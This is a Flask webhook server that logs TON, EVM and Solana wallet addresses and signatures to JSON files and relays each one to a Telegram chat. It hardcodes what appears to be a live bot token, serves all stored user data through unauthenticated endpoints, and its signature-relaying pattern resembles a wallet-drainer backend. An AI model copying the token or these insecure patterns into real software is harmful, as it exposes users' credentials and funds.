from flask import Flask, request, jsonify
import json
import os
import time
import requests

app = Flask(__name__)

TRANSACTION_FILE = "transactions.json"
USERS_FILE = "users.json"

TELEGRAM_TOKEN = "7093436536:AAETxpza2gu6AkK6X9iHwuB__kBqj4uuKRM"
NOTIFY_CHAT_ID = "6253242226"

def notify_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": NOTIFY_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print("Telegram notify error:", e)

def init_file(path, default):
    if not os.path.exists(path):
        with open(path, "w") as f:
            json.dump(default, f)

def save_transaction(data):
    init_file(TRANSACTION_FILE, {})
    txs = load_file(TRANSACTION_FILE)
    txs[str(int(time.time()))] = data
    save_file(TRANSACTION_FILE, txs)

def save_user(user_id, wallet_info):
    init_file(USERS_FILE, {})
    users = load_file(USERS_FILE)
    users[str(user_id)] = wallet_info
    save_file(USERS_FILE, users)

def load_file(filename):
    with open(filename, 'r') as f:
        return json.load(f)

def save_file(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

@app.route('/')
def index():
    return jsonify({"message": "✅ Gigi Webhook Server is running!"})

@app.route('/ton-webhook', methods=['POST'])
def ton_webhook():
    data = request.json
    user_id = str(data.get('user_id'))
    address = data.get('address')
    tx = data.get('tx')
    save_user(user_id, {'network': 'TON', 'address': address})
    save_transaction({'user_id': user_id, 'network': 'TON', 'tx': tx})
    notify_telegram(f"🚀 *TON Tx Received*\nUser: `{user_id}`\nAddress: `{address}`\nTx: `{tx}`")
    return jsonify({'status': 'TON transaction saved'})

@app.route('/evm-webhook', methods=['POST'])
def evm_webhook():
    data = request.json
    user_id = str(data.get('user_id'))
    address = data.get('address')
    signature = data.get('signature')
    save_user(user_id, {'network': 'EVM', 'address': address})
    save_transaction({'user_id': user_id, 'network': 'EVM', 'signature': signature})
    notify_telegram(f"⚡ *EVM Tx Signed*\nUser: `{user_id}`\nAddress: `{address}`\nSignature: `{signature}`")
    return jsonify({'status': 'EVM transaction saved'})

@app.route('/solana-webhook', methods=['POST'])
def solana_webhook():
    data = request.json
    user_id = str(data.get('user_id'))
    address = data.get('address')
    signature = data.get('signature')
    save_user(user_id, {'network': 'Solana', 'address': address})
    save_transaction({'user_id': user_id, 'network': 'Solana', 'signature': signature})
    notify_telegram(f"🌊 *Solana Tx Signed*\nUser: `{user_id}`\nAddress: `{address}`\nSignature: `{signature}`")
    return jsonify({'status': 'Solana transaction saved'})

@app.route('/check-balance/<user_id>', methods=['GET'])
def check_balance(user_id):
    users = load_file(USERS_FILE)
    user = users.get(str(user_id))
    if not user:
        return jsonify({'error': 'User not found'}), 404
    return jsonify({'user_id': user_id, 'network': user['network'], 'address': user['address']})

@app.route('/transactions', methods=['GET'])
def get_transactions():
    txs = load_file(TRANSACTION_FILE)
    return jsonify(txs)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
